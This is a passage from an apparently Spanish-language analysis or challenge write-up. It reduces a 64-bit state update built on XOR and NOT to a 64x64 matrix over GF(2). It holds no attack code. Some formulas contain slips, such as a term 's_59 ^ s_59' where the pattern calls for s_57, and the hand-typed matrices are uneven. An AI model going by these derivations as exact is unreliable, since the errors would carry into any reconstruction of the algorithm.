\\overline{s_{60}}, \\dots, \\overline{s_2}, \\overline{(s_1 \\hat{} s_{63})}, \\overline{(s_0 \\hat{} s_{62})}, \\overline{s_{61}}] $$\nY ahora tenemos operaciones por cada 4 bits de state (copiados en la variable cur). Por ejemplo:\n$$ \\mathrm{cur} = [s_3, s_2, s_1, s_0] $$\n$$ \\mathrm{cur} = [0, 0, 0, s_3] \\quad|\\quad [0, 0, s_3, 0] \\quad|\\quad [s_0, 0, 0, 0] \\quad|\\quad [0, s_0, 0, 0] $$\n$$ \\mathrm{cur} = [s_0, s_0, s_3, s_3] $$\n$$ \\mathrm{state}[3..0] = [s_3, s_2, s_1, s_0] \\hat{} [s_0, s_0, s_3, s_3] $$\nPor lo que state cambia así:\n$$ \\mathrm{state}[3..0] = [(s_3 \\hat{} s_0), (s_2 \\hat{} s_0), (s_1 \\hat{} s_3), (s_0 \\hat{} s_3)] $$\nY por tanto, la variable state completa cambia de esta manera (nótese que en cada cuarteto, el primer bit y el último son iguales):\n$$ \\mathrm{state}[63..60] = [(s_{63} \\hat{} s_{60}), (s_{62} \\hat{} s_{60}), (s_{61} \\hat{} s_{63}), (s_{60} \\hat{} s_{63})] $$\n$$ \\mathrm{state}[59..56] = [(s_{59} \\hat{} s_{56}), (s_{58} \\hat{} s_{56}), (s_{59} \\hat{} s_{59}), (s_{56} \\hat{} s_{59})] $$\n$$ \\dots $$\n$$ \\mathrm{state}[3..0] = [(s_3 \\hat{} s_0), (s_2 \\hat{} s_0), (s_1 \\hat{} s_3), (s_0 \\hat{} s_3)] $$\nFinalmente, si unimos las dos etapas del cambio de state, tenemos lo siguiente:\n$$ \\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0] $$\nY el siguiente state será:\n$$ \\mathrm{state} = [(\\overline{s_{62}} \\hat{} \\overline{s_{59}}), (\\overline{s_{61}} \\hat{} \\overline{s_{59}}), (\\overline{s_{60}} \\hat{} \\overline{s_{62}}), (\\overline{s_{59}} \\hat{} \\overline{s_{62}}), $$\n$$ (\\overline{s_{58}} \\hat{} \\overline{s_{55}}), (\\overline{s_{57}} \\hat{} \\overline{s_{55}}), (\\overline{s_{56}} \\hat{} \\overline{s_{58}}), (\\overline{s_{55}} \\hat{} \\overline{s_{58}}), $$\n$$ \\dots $$\n$$ (\\overline{s_6} \\hat{} \\overline{s_3}), (\\overline{s_5} \\hat{} \\overline{s_3}), (\\overline{s_4} \\hat{} \\overline{s_6}), (\\overline{s_3} \\hat{} \\overline{s_6}), $$\n$$ (\\overline{s_2} \\hat{} \\overline{s_{61}}), (\\overline{(s_1 \\hat{} s_{63})} \\hat{} \\overline{s_{61}}), (\\overline{(s_0 \\hat{} s_{62})} \\hat{} \\overline{s_2}), (\\overline{s_{61}} \\hat{} \\overline{s_2})] $$\nNótese que $\\overline{a} \\hat{} \\overline{b} = a \\hat{} b$, por lo que el siguiente state se puede simplificar a:\n$$ \\mathrm{state} = [(s_{59} \\hat{} s_{62}), (s_{59} \\hat{} s_{61}), (s_{60} \\hat{} s_{62}), (s_{59} \\hat{} s_{62}), $$\n$$ (s_{55} \\hat{} s_{58}), (s_{55} \\hat{} s_{57}), (s_{56} \\hat{} s_{58}), (s_{55} \\hat{} s_{58}), $$\n$$ \\dots $$\n$$ (s_3 \\hat{} s_6), (s_3 \\hat{} s_5), (s_4 \\hat{} s_6), (s_3 \\hat{} s_6), $$\n$$ (s_2 \\hat{} s_{61}), (s_1 \\hat{} s_{61} \\hat{} s_{63}), (s_0 \\hat{} s_2 \\hat{} s_{62}), (s_2 \\hat{} s_{61})] $$\nRecordemos que este nuevo state es para la siguiente iteración del algoritmo de código evolutivo. Podríamos continuar así hasta la última iteración, pero sería muy largo. En cambio, podemos crear una matriz de 64x64 tal que, dado un state, genere el siguiente (también es muy grande, pero será más fácil de utilizar):\n$$ \\begin{pmatrix} 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\color{red}{1} 0 0 0 \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\newline \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\end{pmatrix} $$\nSi llamamos a esta matriz $A$, tenemos esta relación:\n$$ \\begin{pmatrix} n_{63} \\newline n_{62} \\newline \\vdots \\newline n_1 \\newline n_0 \\end{pmatrix} = A \\cdot \\begin{pmatrix} s_{63} \\newline s_{62} \\newline \\vdots \\newline s_1 \\newline s_0 \\end{pmatrix} $$\nDonde $n$ es el siguiente state y $s$ es el state actual en una determinada iteración.\nPodemos mejorar esta matriz sabiendo que el primer bit y el último de cada cuarteto son el mismo, por lo que $s_{63} = s_{60}$, $s_{59} = s_{56}$ hasta $s_3 = s_0$:\n$$ \\begin{pmatrix} 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 